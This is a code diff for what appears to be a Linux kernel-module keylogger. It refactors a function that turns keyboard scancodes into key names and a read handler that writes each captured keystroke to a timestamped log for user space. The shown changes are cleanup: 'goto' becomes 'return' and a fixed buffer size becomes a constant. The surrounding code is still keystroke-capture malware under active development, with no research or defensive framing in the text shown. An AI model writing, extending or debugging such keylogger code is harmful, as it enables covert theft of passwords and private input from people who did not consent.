@@ -62,33 +62,32 @@ static void get_key_name(unsigned int scancode, char *buf) {
       switch (scancode) {
       case 0x0F:
         snprintf(buf, KEYBUF_SIZE, "TAB");
-        goto termination;
+        return;
       case 0x53:
         snprintf(buf, KEYBUF_SIZE, "DELETE");
-        goto termination;
+        return;
       case 0x47:
         snprintf(buf, KEYBUF_SIZE, "HOME");
-        goto termination;
+        return;
       case 0x4F:
         snprintf(buf, KEYBUF_SIZE, "END");
-        goto termination;
+        return;
       case 0x4B:
         snprintf(buf, KEYBUF_SIZE, "LEFT");
-        goto termination;
+        return;
       case 0x48:
         snprintf(buf, KEYBUF_SIZE, "UP");
-        goto termination;
+        return;
       case 0x50:
         snprintf(buf, KEYBUF_SIZE, "DOWN");
-        goto termination;
+        return;
       case 0x4D:
         snprintf(buf, KEYBUF_SIZE, "RIGHT");
-        goto termination;
+        return;
       }
       snprintf(buf, KEYBUF_SIZE, "0x%02x", scancode);
     }
   }
-termination:
   *(buf + 1) = 0;
 }
 
@@ -122,10 +121,10 @@ static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
     struct tm tm;
     time64_to_tm(ts.tv_sec, 0, &tm);
 
-    klen +=
-        snprintf(kbuf + klen, 64, "%04ld-%02d-%02d %02d:%02d:%02d.%09ld %s\n",
-                 tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour,
-                 tm.tm_min, tm.tm_sec, ts.tv_nsec, keybuf);
+    klen += snprintf(kbuf + klen, LOG_ENTRY_SIZE,
+                     "%04ld-%02d-%02d %02d:%02d:%02d.%09ld %s\n",
+                     tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour,
+                     tm.tm_min, tm.tm_sec, ts.tv_nsec, keybuf);
   }
 
   keylog_count = 0;
